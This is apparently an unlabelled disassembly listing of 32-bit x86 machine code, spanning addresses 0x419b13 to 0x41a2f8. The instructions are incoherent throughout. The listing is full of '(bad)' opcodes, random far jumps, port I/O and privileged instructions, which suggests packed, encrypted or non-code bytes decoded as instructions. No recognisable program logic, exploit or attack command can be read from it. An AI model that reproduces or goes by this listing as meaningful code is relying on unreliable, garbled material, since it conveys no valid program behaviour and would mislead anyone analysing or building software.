  419b13:	ffree  st(1)
  419b15:	jmp    0x419aeb
  419b17:	jmp    0x84c91f7
  419b1c:	fucomip st,st(0)
  419b1e:	mov    dl,0xeb
  419b20:	(bad)  
  419b21:	in     al,dx
  419b22:	loop   0x419aed
  419b24:	mul    ah
  419b26:	mov    edx,0xd3b5d3fb
  419b2b:	(bad)  
  419b2d:	cmc    
  419b2e:	(bad)  
  419b30:	not    edx
  419b32:	fstp   TBYTE PTR [ebp+0x2c4f204]
  419b38:	out    dx,al
  419b39:	fcmovnb st,st(6)
  419b3b:	fmul   QWORD PTR [eax]
  419b3d:	or     ch,BYTE PTR [eax-0x291e1441]
  419b43:	scas   al,BYTE PTR es:[edi]
  419b44:	jmp    0xdb0c8429
  419b49:	lods   al,BYTE PTR ds:[esi]
  419b4a:	in     al,0xb6
  419b4c:	loop   0x419b45
  419b4e:	mov    esi,0xe1daddd6
  419b53:	push   es
  419b54:	idiv   ebp
  419b56:	aam    0xda
  419b58:	aad    0xf8
  419b5a:	(bad)  
  419b5c:	out    0xee,eax
  419b5e:	repnz int 0xad
  419b61:	loop   0x419b26
  419b63:	imul   eax
  419b65:	mov    cl,0xed
  419b67:	fdivr  DWORD PTR [ecx-0x817240e]
  419b6d:	fld    QWORD PTR [edx]
  419b6f:	hlt    
  419b70:	loop   0x419b42
  419b72:	(bad)  
  419b74:	(bad)  
  419b76:	(bad)  
  419b77:	(bad)  
  419b79:	or     eax,0x1f809e6
  419b7e:	icebp  
  419b7f:	in     al,dx
  419b80:	loope  0x419b6d
  419b82:	icebp  
  419b83:	leave  
  419b84:	jmp    0xdcf8:0xe4f5d4d7
  419b8b:	sti    
  419b8c:	neg    edx
  419b8e:	mov    eax,0xd5bcf2e2
  419b93:	fld    QWORD PTR [edx]
  419b95:	add    ecx,esp
  419b97:	hlt    
  419b98:	pmaddwd mm0,QWORD PTR [eax]
  419b9b:	(bad)  
  419b9c:	adc    cl,BYTE PTR [ecx+ebp*8]
  419b9f:	test   al,0xb0
  419ba1:	mov    al,0xe9
  419ba3:	mov    esp,0xd6c4cfb7
  419ba8:	into   
  419ba9:	aam    0xf1
  419bab:	mov    esi,0xf000fdef
  419bb0:	push   es
  419bb1:	rcl    edx,0xe6
  419bb4:	rol    cl,cl
  419bb6:	or     cl,bl
  419bb8:	add    eax,esp
  419bba:	cmc    
  419bbb:	enter  0x13cc,0xc8
  419bbf:	icebp  
  419bc0:	out    0xcb,eax
  419bc2:	int3   
  419bc3:	repnz (bad) 
  419bc5:	mov    dh,0xef
  419bc7:	(bad)  
  419bc8:	out    dx,al
  419bc9:	(bad)  
  419bca:	in     al,0xdf
  419bcc:	leave  
  419bcd:	aad    0xf9
  419bcf:	(bad)  
  419bd1:	in     eax,dx
  419bd2:	(bad)  
  419bd4:	out    0xc6,eax
  419bd6:	rol    ebp,1
  419bd8:	or     ah,dh
  419bda:	in     al,dx
  419bdb:	or     dl,dh
  419bdd:	fsubr  DWORD PTR [ebp-0x373b2937]
  419be3:	out    0xc6,eax
  419be5:	out    0xf6,eax
  419be7:	mov    ch,0xd0
  419be9:	repnz mov ecx,0x1daf3f4
  419bef:	int3   
  419bf0:	stc    
  419bf1:	xlat   BYTE PTR ds:[ebx]
  419bf2:	cmc    
  419bf3:	icebp  
  419bf4:	or     bh,ch
  419bf6:	in     al,0x7
  419bf8:	fisttp DWORD PTR [ebx]
  419bfa:	fmul   QWORD PTR [ecx+ecx*8]
  419bfd:	add    al,bl
  419bff:	ffree  st(5)
  419c01:	retf   
  419c02:	mov    ebp,0xcbf6cbb7
  419c07:	fmul   st,st(7)
  419c09:	jmp    0x419be1
  419c0b:	stc    
  419c0c:	test   bl,0xd7
  419c0f:	rcl    bh,1
  419c11:	mov    esi,0x5f8d807
  419c16:	sar    ah,0xf7
  419c19:	(bad)  
  419c1b:	(bad)  
  419c1c:	sti    
  419c1d:	ror    edi,cl
  419c1f:	mov    al,0xf6
  419c21:	(bad)  
  419c22:	(bad)  
  419c23:	stos   BYTE PTR es:[edi],al
  419c24:	jmp    0xb7f5:0xcadbb7c6
  419c2b:	mov    ebx,0xfdf7e2f6
  419c30:	out    0xc3,al
  419c32:	lds    edi,FWORD PTR [edx-0x15291f3e]
  419c38:	div    dh
  419c3a:	(bad)  
  419c3c:	into   
  419c3d:	iret   
  419c3e:	iret   
  419c3f:	stos   BYTE PTR es:[edi],al
  419c40:	test   eax,0xcdc0dccd
  419c45:	aam    0xb2
  419c47:	mov    ah,0xb7
  419c49:	retf   
  419c4a:	(bad)
  419c4d:	cld    
  419c4e:	fcom   st(4)
  419c50:	cli    
  419c51:	fiadd  WORD PTR ds:0xf7c6fb
  419c57:	loopne 0x419c51
  419c59:	dec    DWORD PTR [edx]
  419c5b:	repz fimul WORD PTR ds:0xb7eccee8
  419c62:	mov    dh,0xd1
  419c64:	aad    0xe9
  419c66:	clc    
  419c67:	mov    al,0xf7
  419c69:	mov    dh,0xc9
  419c6b:	mov    dl,0xcd
  419c6d:	xlat   BYTE PTR ds:[ebx]
  419c6e:	(bad)  
  419c6f:	mov    esp,0xbe06fff0
  419c74:	repnz or edx,eax
  419c77:	aam    0xe1
  419c79:	out    0xe4,eax
  419c7b:	jmp    0x419c84
  419c7d:	call   0xee0c7b2a
  419c82:	retf   
  419c83:	(bad)  
  419c84:	mov    bl,0xe2
  419c86:	not    ebx
  419c88:	retf   
  419c89:	mov    ebx,0xffd4d9d9
  419c8e:	mov    bh,0xdd
  419c90:	in     eax,dx
  419c91:	fcmovnu st,st(0)
  419c93:	in     al,dx
  419c94:	rcr    cl,1
  419c96:	retf   0xe2c5
  419c99:	enter  0xfee4,0xe3
  419c9d:	into   
  419c9e:	jmp    0xd7095962
  419ca3:	mov    ah,0xdb
  419ca5:	test   al,0xef
  419ca7:	mov    eax,0xe3b5f4e7
  419cac:	out    dx,eax
  419cad:	mov    esi,0x2d5c8d9
  419cb2:	pop    es
  419cb3:	repnz fcmovu st,st(1)
  419cb6:	or     al,BYTE PTR [edx]
  419cb8:	or     ch,dl
  419cba:	in     al,dx
  419cbb:	sti    
  419cbc:	int    0x9
  419cbe:	stos   BYTE PTR es:[edi],al
  419cbf:	stos   BYTE PTR es:[edi],al
  419cc0:	scas   al,BYTE PTR es:[edi]
  419cc1:	int3   
  419cc2:	fmul   st(2),st
  419cc4:	test   eax,0xb0d2e9e4
  419cc9:	out    dx,al
  419cca:	fsubr  st,st(6)
  419ccc:	leave  
  419ccd:	jecxz  0x419cb0
  419ccf:	hlt    
  419cd0:	in     al,dx
  419cd1:	aad    0xc0
  419cd3:	(bad)  
  419cd4:	inc    BYTE PTR [esi]
  419cd6:	fld    DWORD PTR ds:0xe9ddfbbd
  419cdc:	fcmovne st,st(1)
  419cde:	out    0xce,al
  419ce0:	loope  0x419caf
  419ce2:	mov    bh,0xb0
  419ce4:	into   
  419ce5:	call   0xf62a51e4
  419cea:	fstp   TBYTE PTR [esi-0x31030e3d]
  419cf0:	fild   DWORD PTR ds:0xf005d303
  419cf6:	(bad)  
  419cf7:	in     al,0xf4
  419cf9:	retf   0xc2e9
  419cfc:	jecxz  0x419d07
  419cfe:	out    dx,al
  419cff:	ret    0xc2dc
  419d02:	shl    bh,cl
  419d04:	hlt    
  419d05:	retf   0xf7c5
  419d08:	jmp    0xd2cc:0xd9d2cdb8
  419d0f:	sar    eax,cl
  419d11:	add    BYTE PTR [esi],al
  419d13:	or     esi,edi
  419d15:	sar    eax,1
  419d17:	add    BYTE PTR [eax],cl
  419d19:	into   
  419d1a:	(bad)
  419d1d:	jmp    0xdf3869cd
  419d22:	hlt    
  419d23:	aam    0xe2
  419d25:	jmp    0xf429720f
  419d2a:	mov    bh,0xea
  419d2c:	aad    0xca
  419d2e:	xlat   BYTE PTR ds:[ebx]
  419d2f:	fcmovnbe st,st(0)
  419d31:	rcr    bh,0xde
  419d34:	shl    ebx,1
  419d36:	(bad)
  419d39:	add    al,0xcb
  419d3b:	pop    es
  419d3c:	or     cl,dh
  419d3e:	lods   al,BYTE PTR ds:[esi]
  419d3f:	retf   0xe6f6
  419d42:	in     eax,0xdb
  419d44:	in     eax,dx
  419d45:	mov    ch,0xec
  419d47:	jmp    0x419d37
  419d49:	fcomip st,st(7)
  419d4b:	int3   
  419d4c:	idiv   ebp
  419d4e:	ret    
  419d4f:	div    edi
  419d51:	in     eax,0x0
  419d53:	push   es
  419d54:	or     al,bl
  419d56:	fsubrp st(7),st
  419d58:	(bad)  
  419d59:	leave  
  419d5a:	push   cs
  419d5b:	or     eax,0xe0ddde00
  419d60:	repnz out dx,eax
  419d62:	shr    DWORD PTR [ebp-0xf042c09],0xcd
  419d69:	neg    dh
  419d6b:	out    dx,al
  419d6c:	fucomip st,st(2)
  419d6e:	out    dx,eax
  419d6f:	add    bl,dh
  419d71:	ret    0xd300
  419d74:	loopne 0x419d58
  419d76:	or     esp,esp
  419d78:	out    dx,eax
  419d79:	sti    
  419d7a:	jmp    0xb9259778
  419d7f:	into   
  419d80:	imul   dh
  419d82:	(bad)  
  419d83:	retf   
  419d84:	in     eax,0xc9
  419d86:	rcl    ecx,1
  419d88:	les    esi,FWORD PTR [eax-0x1d294726]
  419d8e:	in     al,dx
  419d8f:	icebp  
  419d90:	out    0xc7,al
  419d92:	(bad)  
  419d93:	cli    
  419d94:	mov    ebp,0xd5e3f0d7
  419d99:	add    ebp,esp
  419d9b:	out    dx,eax
  419d9c:	fisttp QWORD PTR [ebx]
  419d9e:	jecxz  0x419d8e
  419da0:	(bad)  
  419da2:	scas   eax,DWORD PTR es:[edi]
  419da3:	mov    ah,0xed
  419da5:	mov    edx,0xf2f4d9d8
  419daa:	in     al,0xd3
  419dac:	sar    DWORD PTR [eax-0x2e3c26fe],cl
  419db2:	stc    
  419db3:	mov    esp,0xe3fae5f2
  419db8:	dec    cl
  419dba:	(bad)  
  419dbc:	leave  
  419dbd:	or     dl,cl
  419dbf:	lds    ebp,FWORD PTR [ecx-0x52431129]
  419dc5:	out    dx,al
  419dc6:	(bad)  
  419dc7:	hlt    
  419dc8:	repnz retf 
  419dca:	fcmovnb st,st(4)
  419dcc:	hlt    
  419dcd:	fsqrt  
  419dcf:	cli    
  419dd0:	out    0xd7,al
  419dd2:	ret    
  419dd3:	dec    DWORD PTR [ebx]
  419dd5:	jmp    0x419dd4
  419dd7:	ret    0xe4ff
  419dda:	(bad)  
  419ddc:	add    DWORD PTR [edi],ecx
  419dde:	loop   0x419dae
  419de0:	mov    bh,0xf3
  419de2:	iret   
  419de3:	leave  
  419de4:	loopne 0x419dbc
  419de6:	retf   0xd0e8
  419de9:	sti    
  419dea:	(bad)  
  419dec:	jecxz  0x419de3
  419dee:	push   ebp
  419df0:	rcr    bh,cl
  419df2:	fsubr  st(2),st
  419df4:	cli    
  419df5:	jmp    0x419dfa
  419df7:	add    ah,bh
  419df9:	loop   0x419dd9
  419dfb:	(bad)  
  419dfe:	(bad)  
  419e00:	test   eax,0xc4e9c7c2
  419e05:	(bad)  
  419e06:	(bad)  
  419e07:	(bad)  
  419e08:	mov    eax,0xf2bde8ac
  419e0d:	fcomip st,st(7)
  419e0f:	(bad)  
  419e10:	sti    
  419e11:	add    esp,edx
  419e13:	(bad)  
  419e14:	sti    
  419e15:	fcmovbe st,st(0)
  419e17:	add    eax,0xf8f9d8ff
  419e1c:	stc    
  419e1d:	in     al,0xb1
  419e1f:	lods   eax,DWORD PTR ds:[esi]
  419e20:	iret   
  419e21:	ror    ch,1
  419e23:	lods   eax,DWORD PTR ds:[esi]
  419e24:	call   0xb10f93f7
  419e29:	mov    edi,0xe9efb8c5
  419e2e:	(bad)  
  419e30:	in     al,dx
  419e31:	pop    es
  419e32:	hlt    
  419e33:	rol    BYTE PTR [esi],cl
  419e35:	repnz jmp 0xff0b:0xe9fae7d6
  419e3d:	loope  0x419dff
  419e3f:	rol    ebp,1
  419e41:	scas   al,BYTE PTR es:[edi]
  419e42:	ror    esi,cl
  419e44:	shl    dl,1
  419e46:	mov    cl,0xc8
  419e48:	clc    
  419e49:	int    0xfa
  419e4b:	inc    DWORD PTR [ebx]
  419e4d:	(bad)  
  419e4f:	sar    DWORD PTR [ebp-0x81f2dfb],0xc0
  419e56:	fdiv   st(5),st
  419e58:	or     ch,dl
  419e5a:	std    
  419e5b:	jmp    0xc1e3:0xbda7fe00
  419e62:	mov    bl,0xf7
  419e64:	mov    dh,0xf1
  419e66:	in     al,0xb8
  419e68:	frstpm(287 only) 
  419e6a:	(bad)  
  419e6b:	jmp    0xc134615c
  419e70:	mov    esp,0xc1f8fad3
  419e75:	les    eax,FWORD PTR ds:0xc7e2f602
  419e7b:	add    edi,ebx
  419e7d:	iret   
  419e7e:	in     eax,dx
  419e7f:	call   0xcaf26c6a
  419e84:	test   ebx,0xb6eacfc1
  419e8a:	jmp    0xfd3f685e
  419e8f:	out    dx,eax
  419e90:	(bad)  
  419e91:	hlt    
  419e92:	fild   DWORD PTR [esi]
  419e94:	rol    cl,1
  419e96:	retf   
  419e97:	jmp    0x508677d
  419e9c:	add    eax,0xafd8b204
  419ea1:	cmc    
  419ea2:	int    0xd3
  419ea4:	jmp    0x419e7a
  419ea6:	aad    0xc4
  419ea8:	mov    bh,0xfe
  419eaa:	into   
  419eab:	mov    ch,0xef
  419ead:	out    dx,eax
  419eae:	out    dx,eax
  419eaf:	imul   esi
  419eb1:	clc    
  419eb2:	mov    ebp,0xeae3bcbd
  419eb7:	ret    0xbc4
  419eba:	(bad)
  419ebd:	shl    al,0xbf
  419ec0:	int    0xeb
  419ec2:	jecxz  0x419eae
  419ec4:	in     eax,dx
  419ec5:	ror    al,0xb9
  419ec8:	out    0xf5,eax
  419eca:	into   
  419ecb:	imul   ecx
  419ecd:	int    0xed
  419ecf:	repz out 0xc2,al
  419ed2:	fcmovnu st,st(6)
  419ed4:	shl    eax,cl
  419ed6:	fsub   st(1),st
  419ed8:	cld    
  419ed9:	add    eax,ebx
  419edb:	(bad)  
  419edc:	iret   
  419edd:	in     al,0xa7
  419edf:	rcl    eax,cl
  419ee1:	jecxz  0x419e91
  419ee3:	mov    bh,0xc6
  419ee5:	rol    eax,cl
  419ee7:	aad    0xb9
  419ee9:	(bad)  
  419eeb:	xlat   BYTE PTR ds:[ebx]
  419eec:	xlat   BYTE PTR ds:[ebx]
  419eed:	hlt    
  419eee:	in     eax,dx
  419eef:	out    dx,eax
  419ef0:	add    edx,ebx
  419ef2:	repnz shl eax,cl
  419ef5:	repnz fucomp st(0)
  419ef8:	bswap  esi
  419efa:	out    0x7,al
  419efc:	add    eax,0xefe7e6eb
  419f01:	mov    esi,0xb3fbcae2
  419f06:	leave  
  419f07:	xlat   BYTE PTR ds:[ebx]
  419f08:	sar    cl,cl
  419f0a:	(bad)  
  419f0b:	hlt    
  419f0c:	aad    0x1
  419f0e:	ret    0xd4d5
  419f11:	out    0xfa,al
  419f13:	mul    ch
  419f15:	hlt    
  419f16:	in     al,0xe5
  419f18:	hlt    
  419f19:	iret   
  419f1a:	enter  0xe6ee,0xd9
  419f1e:	int    0xc4
  419f20:	out    0xd1,al
  419f22:	(bad)  
  419f23:	leave  
  419f24:	mov    bh,0xc9
  419f26:	(bad)  
  419f27:	out    dx,eax
  419f28:	neg    ebp
  419f2a:	clc    
  419f2b:	cmc    
  419f2c:	ret    
  419f2d:	hlt    
  419f2e:	mov    ecx,0xfa03b9dd
  419f33:	(bad)  
  419f34:	clc    
  419f35:	add    ebx,ebx
  419f37:	or     ah,ch
  419f39:	stc    
  419f3a:	in     al,0xdb
  419f3c:	(bad)  
  419f3e:	lods   al,BYTE PTR ds:[esi]
  419f3f:	leave  
  419f40:	imul   BYTE PTR [ebp-0x140e142c]
  419f46:	mov    ch,0xf1
  419f48:	enter  0xced8,0xd8
  419f4c:	clc    
  419f4d:	ret    0xecf9
  419f50:	fincstp 
  419f52:	(bad)  
  419f53:	dec    DWORD PTR [edx]
  419f55:	add    eax,0x6e8f501
  419f5a:	add    bl,cl
  419f5c:	std    
  419f5d:	loope  0x419f2a
  419f5f:	out    dx,eax
  419f60:	xlat   BYTE PTR ds:[ebx]
  419f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f62:	cmc    
  419f63:	test   bh,0xe7
  419f66:	fcomi  st,st(1)
  419f68:	cmc    
  419f69:	int3   
  419f6a:	ror    ebp,cl
  419f6c:	cld    
  419f6d:	mov    esp,0xd3d6d8cc
  419f72:	loop   0x419f53
  419f74:	fdivr  st,st(3)
  419f76:	retf   
  419f77:	(bad)
  419f7a:	in     eax,0x7
  419f7c:	or     al,BYTE PTR [esi+ebp*8]
  419f7f:	ret    
  419f80:	out    dx,eax
  419f81:	out    dx,eax
  419f82:	mul    dh
  419f84:	mov    ah,0xdb
  419f86:	neg    al
  419f88:	fdivr  DWORD PTR [esi-0x1609303c]
  419f8e:	in     eax,dx
  419f8f:	fsub   st,st(6)
  419f91:	ret    
  419f92:	int3   
  419f93:	jmp    0x419f77
  419f95:	retf   0xc2de
  419f98:	out    dx,al
  419f99:	or     cl,dh
  419f9b:	call   0xe3ee6eaf
  419fa0:	xlat   BYTE PTR ds:[ebx]
  419fa1:	in     eax,dx
  419fa2:	iret   
  419fa3:	ret    0xcbcc
  419fa6:	scas   eax,DWORD PTR es:[edi]
  419fa7:	ror    dl,1
  419fa9:	jmp    0x419f65
  419fab:	(bad)  
  419fac:	jmp    0x419f8d
  419fae:	out    dx,al
  419faf:	rcr    bh,0x2
  419fb2:	aam    0xc0
  419fb4:	out    0xf6,eax
  419fb6:	fsubp  st(1),st
  419fb8:	aam    0xd
  419fba:	cld    
  419fbb:	hlt    
  419fbc:	std    
  419fbd:	push   cs
  419fbe:	stos   BYTE PTR es:[edi],al
  419fbf:	shr    dh,1
  419fc1:	in     al,0xd4
  419fc3:	lock loope 0x419fc1
  419fc6:	fdiv   st,st(7)
  419fc8:	mov    cl,0xf7
  419fca:	iret   
  419fcb:	sti    
  419fcc:	mov    ecx,0xd0e0f3b8
  419fd1:	in     al,dx
  419fd2:	add    al,0xec
  419fd4:	lds    eax,FWORD PTR [ebx]
  419fd6:	lock jmp 0xf3ce:0xeb0fc4c6
  419fde:	out    dx,eax
  419fdf:	mov    esi,0xaecaead0
  419fe4:	mov    ch,0xed
  419fe6:	cli    
  419fe7:	neg    edi
  419fe9:	cmc    
  419fea:	cld    
  419feb:	xlat   BYTE PTR ds:[ebx]
  419fec:	jecxz  0x419fa9
  419fee:	fsubp  st(4),st
  419ff0:	into   
  419ff1:	pop    es
  419ff2:	in     eax,dx
  419ff3:	rcr    dh,1
  419ff5:	cli    
  419ff6:	loopne 0x419fdd
  419ff8:	add    ebx,ebx
  419ffa:	fcmove st,st(6)
  419ffc:	push   cs
  419ffd:	into   
  419ffe:	int3   
  419fff:	iret   
  41a000:	test   eax,0xacc2c6f6
  41a005:	rol    ch,0xe0
  41a008:	int3   
  41a009:	mov    ah,0xcf
  41a00b:	mov    esp,0xbcd1d5d6
  41a010:	repz test DWORD PTR ds:0x6f0e6,0xfadaf5f8
  41a01b:	loop   0x41a017
  41a01d:	fcmovbe st,st(3)
  41a01f:	call   0xdd3566d5
  41a024:	out    0xd6,eax
  41a026:	shl    esi,0xd7
  41a029:	int    0xb4
  41a02b:	aad    0xd1
  41a02d:	mov    ebp,0xe1faced7
  41a032:	add    esp,ecx
  41a034:	cld    
  41a035:	hlt    
  41a036:	fsubr  st,st(0)
  41a038:	out    0xe1,al
  41a03a:	out    dx,eax
  41a03b:	push   es
  41a03c:	push   cs
  41a03d:	adc    ch,BYTE PTR [ebp+eiz*8-0x1d093d1b]
  41a044:	in     eax,0xac
  41a046:	fnstcw WORD PTR [ecx-0x20083715]
  41a04c:	ror    esp,1
  41a04e:	aad    0xdd
  41a050:	ret    
  41a051:	repnz in eax,0xe4
  41a054:	idiv   esp
  41a056:	clc    
  41a057:	in     eax,0xc7
  41a059:	or     eax,0xd3eb0fc4
  41a05e:	stos   DWORD PTR es:[edi],eax
  41a05f:	fild   QWORD PTR [eax-0x3831434e]
  41a065:	cli    
  41a066:	mov    ch,0xc5
  41a068:	jmp    0xbe2f8d27
  41a06d:	fyl2xp1 
  41a06f:	sar    ah,0xd4
  41a072:	in     eax,dx
  41a073:	repz jecxz 0x41a03d
  41a076:	add    edi,edx
  41a078:	femms  
  41a07a:	add    dl,bl
  41a07c:	out    0x9,eax
  41a07e:	(bad)
  41a081:	mov    bh,0xd2
  41a083:	out    dx,al
  41a084:	mov    dh,0xe0
  41a086:	cli    
  41a087:	(bad)  
  41a089:	in     al,dx
  41a08a:	mov    ebp,0xdcdfb8cc
  41a08f:	fadd   st,st(1)
  41a091:	in     eax,0xfe
  41a093:	add    DWORD PTR [ebx],eax
  41a095:	(bad)  
  41a097:	loope  0x41a068
  41a099:	sti    
  41a09a:	add    cl,al
  41a09c:	loope  0x41a090
  41a09e:	(bad)
  41a0a1:	repz cmc 
  41a0a3:	fdiv   QWORD PTR [edi-0x4018100d]
  41a0a9:	mov    edi,0xeef9f6fb
  41a0ae:	icebp  
  41a0af:	(bad)  
  41a0b0:	(bad)  
  41a0b1:	xlat   BYTE PTR ds:[ebx]
  41a0b2:	rol    edx,cl
  41a0b4:	mov    esp,0xf6fdf9fb
  41a0b9:	out    0xa,al
  41a0bb:	in     eax,0x2
  41a0bd:	add    edi,DWORD PTR [ebp-0xb493d54]
  41a0c3:	out    0xdb,al
  41a0c5:	lds    esi,FWORD PTR [edi-0x3470825]
  41a0cb:	enter  0xf4f2,0xfd
  41a0cf:	mov    dh,0xec
  41a0d1:	sti    
  41a0d2:	add    ebx,ebx
  41a0d4:	ret    0xebd9
  41a0d7:	(bad)  
  41a0d8:	(bad)  
  41a0da:	fcmove st,st(7)
  41a0dc:	jmp    0xddb7:0xe6c4adce
  41a0e3:	lods   al,BYTE PTR ds:[esi]
  41a0e4:	ret    
  41a0e5:	cli    
  41a0e6:	test   dh,0xd4
  41a0e9:	rcl    bl,cl
  41a0eb:	mov    esp,0xb6defde3
  41a0f0:	in     al,dx
  41a0f1:	inc    DWORD PTR [eax]
  41a0f3:	fcmovnbe st,st(2)
  41a0f5:	inc    BYTE PTR ds:0xdfe4fdf4
  41a0fb:	push   cs
  41a0fc:	sti    
  41a0fd:	add    esp,ebx
  41a0ff:	ror    al,1
  41a101:	out    dx,al
  41a102:	in     eax,0xd6
  41a104:	int3   
  41a105:	into   
  41a106:	mov    bh,0xae
  41a108:	jmp    0x41a102
  41a10a:	retf   0xd4ce
  41a10d:	test   bh,0xba
  41a110:	int    0x7
  41a112:	stc    
  41a113:	loop   0x41a116
  41a115:	mov    DWORD PTR ds:0xd803d9c0,0xcfe9fd05
  41a11f:	ror    ecx,cl
  41a121:	xlat   BYTE PTR ds:[ebx]
  41a122:	in     al,0xe2
  41a124:	(bad)  
  41a125:	shr    esp,cl
  41a127:	rcl    edx,cl
  41a129:	fxch   st(7)
  41a12b:	enter  0xfed8,0xdb
  41a12f:	loope  0x41a10f
  41a131:	(bad)  
  41a132:	fnclex 
  41a134:	mov    ebp,0xe4c1e8e6
  41a139:	mov    esp,0xe7eccee4
  41a13e:	repz mov eax,0xeeadcedc
  41a144:	icebp  
  41a145:	iret   
  41a146:	cli    
  41a147:	mov    al,0xad
  41a149:	jmp    0x41a141
  41a14b:	(bad)  
  41a14d:	aam    0xdf
  41a14f:	pop    es
  41a150:	loopne 0x41a111
  41a152:	fchs   
  41a154:	add    dh,ch
  41a156:	imul   al
  41a158:	xlat   BYTE PTR ds:[ebx]
  41a159:	std    
  41a15a:	out    0xec,al
  41a15c:	call   0xacec6b5a
  41a161:	mov    al,0xc5
  41a163:	mov    dl,0xcb
  41a165:	mov    dl,0xe7
  41a167:	out    0xdb,al
  41a169:	int3   
  41a16a:	fadd   QWORD PTR [ebx]
  41a16c:	retf   
  41a16d:	add    bl,ch
  41a16f:	inc    DWORD PTR [edi]
  41a171:	mov    edi,0xf1cbebdf
  41a176:	(bad)  
  41a177:	or     bh,dl
  41a179:	cmc    
  41a17a:	add    al,0x1
  41a17c:	int3   
  41a17d:	or     al,cl
  41a17f:	loope  0x41a133
  41a181:	into   
  41a182:	(bad)  
  41a184:	mov    al,0xf5
  41a186:	iret   
  41a187:	(bad)  
  41a188:	out    dx,al
  41a189:	jmp    0x30e7576
  41a18e:	int3   
  41a18f:	call   0xd2407652
  41a194:	aad    0xdf
  41a196:	fadd   DWORD PTR [ecx]
  41a198:	bsf    eax,ebx
  41a19b:	pop    es
  41a19c:	or     ebx,ecx
  41a19e:	scas   eax,DWORD PTR es:[edi]
  41a19f:	repz idiv DWORD PTR [ebp+ecx*8-0x39293f36]
  41a1a7:	retf   0xbee9
  41a1aa:	retf   0xf8f0
  41a1ad:	iret   
  41a1ae:	mov    edx,0xfdddeddd
  41a1b3:	push   es
  41a1b4:	or     ah,dh
  41a1b6:	leave  
  41a1b7:	jmp    0xe42bb0b7
  41a1bc:	(bad)  
  41a1be:	(bad)  
  41a1bf:	out    dx,al
  41a1c0:	loop   0x41a1b2
  41a1c2:	call   0xb83372a2
  41a1c7:	shl    BYTE PTR [ebp-0x264b3147],cl
  41a1cd:	repz fcmovnbe st,st(0)
  41a1d0:	mov    eax,0xadee600
  41a1d5:	add    dh,ah
  41a1d7:	in     eax,0x3
  41a1d9:	(bad)  
  41a1db:	jmp    0x41a1d5
  41a1dd:	fldcw  WORD PTR [esi-0xf433138]
  41a1e3:	sti    
  41a1e4:	shl    edi,0xcf
  41a1e7:	retf   
  41a1e8:	fldl2t 
  41a1ea:	mov    ah,0xdb
  41a1ec:	jmp    0x83861d3
  41a1f1:	mov    ebp,0xdc03d0c0
  41a1f6:	loopne 0x41a1c1
  41a1f8:	rol    bh,0xf5
  41a1fb:	add    eax,0xf3b3cafe
  41a200:	call   0xd3fe82f6
  41a205:	mov    dl,0xc1
  41a207:	mov    edx,0xd9f0f0d7
  41a20c:	cld    
  41a20d:	stc    
  41a20e:	in     al,dx
  41a20f:	fcmovne st,st(7)
  41a211:	into   
  41a212:	loop   0x41a214
  41a214:	rcr    dh,0xb
  41a217:	push   es
  41a218:	inc    esp
  41a21a:	dec    DWORD PTR [ecx]
  41a21c:	(bad)  
  41a21d:	in     eax,dx
  41a21e:	(bad)  
  41a21f:	fdiv   st,st(7)
  41a221:	test   al,0xf7
  41a223:	mov    dl,0xd4
  41a225:	hlt    
  41a226:	mov    ebx,0xf3becfd1
  41a22b:	(bad)  
  41a22c:	stc    
  41a22d:	aam    0xd1
  41a22f:	fabs   
  41a231:	add    esp,ebx
  41a233:	push   es
  41a234:	add    eax,esp
  41a236:	lock (bad) 
  41a238:	sti    
  41a239:	add    eax,0xf9cbf807
  41a23e:	fdivrp st(7),st
  41a240:	loopne 0x41a1f3
  41a242:	mov    esp,0xccb1c3cc
  41a247:	jmp    0x41a200
  41a249:	iret   
  41a24a:	iret   
  41a24b:	out    dx,eax
  41a24c:	mov    ecx,0xf2fac8ec
  41a251:	ret    0xdbfe
  41a254:	jmp    0xff0f:0xafaf9e3
  41a25b:	cld    
  41a25c:	push   es
  41a25d:	in     al,dx
  41a25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a25f:	in     eax,0xaf
  41a261:	(bad)  
  41a262:	repnz (bad) 
  41a264:	xlat   BYTE PTR ds:[ebx]
  41a265:	in     al,0xb0
  41a267:	in     al,0xd1
  41a269:	(bad)  
  41a26a:	hlt    
  41a26b:	retf   0xdcf1
  41a26e:	in     eax,dx
  41a26f:	out    0xcf,eax
  41a271:	loopne 0x41a246
  41a273:	push   es
  41a274:	mov    ebx,0xf9fb0fd4
  41a27a:	out    dx,eax
  41a27b:	(bad)  
  41a27d:	out    0xc3,al
  41a27f:	loope  0x41a262
  41a281:	mov    dh,0xc1
  41a283:	shl    edx,0xfa
  41a286:	mov    bh,0xf0
  41a288:	aad    0xdf
  41a28a:	leave  
  41a28b:	aad    0xff
  41a28d:	int3   
  41a28e:	aad    0xbd
  41a290:	loop   0x41a289
  41a292:	loope  0x41a298
  41a294:	pop    es
  41a295:	fiadd  WORD PTR [eax]
  41a297:	add    cl,BYTE PTR [esi]
  41a299:	(bad)  
  41a29b:	call   0xdf086788
  41a2a0:	rcr    ah,cl
  41a2a2:	mov    dh,0xc5
  41a2a4:	lock sti 
  41a2a6:	lock in eax,dx
  41a2a8:	repz mov esi,0xf3d0c9d6
  41a2ae:	fdivrp st(0),st
  41a2b0:	out    0xd5,eax
  41a2b2:	push   es
  41a2b3:	push   es
  41a2b4:	jmp    0x41a2b9
  41a2b6:	out    0xd0,eax
  41a2b8:	fyl2xp1 
  41a2ba:	stc    
  41a2bb:	inc    BYTE PTR [edi+eax*1]
  41a2be:	lods   eax,DWORD PTR ds:[esi]
  41a2bf:	iret   
  41a2c0:	retf   
  41a2c1:	loope  0x41a2af
  41a2c3:	mov    cl,0xc1
  41a2c5:	aad    0xd4
  41a2c7:	iret   
  41a2c8:	mov    ecx,0xbebfc8ef
  41a2cd:	fxch   st(7)
  41a2cf:	aad    0xde
  41a2d1:	add    bh,bl
  41a2d3:	(bad)  
  41a2d4:	idiv   ah
  41a2d6:	pop    es
  41a2d7:	loope  0x41a2b3
  41a2d9:	in     al,0xe7
  41a2db:	stc    
  41a2dc:	(bad)
  41a2df:	out    0xa9,eax
  41a2e1:	jecxz  0x41a2b8
  41a2e3:	jmp    0xe6ba:0xf6f8f6b6
  41a2ea:	std    
  41a2eb:	retf   
  41a2ec:	fdivp  st(6),st
  41a2ee:	inc    DWORD PTR [edx]
  41a2f0:	add    al,BYTE PTR [eax]
  41a2f2:	add    cl,bh
  41a2f4:	push   es
  41a2f5:	(bad)  
  41a2f6:	in     al,0xde
  41a2f8:	(bad)  
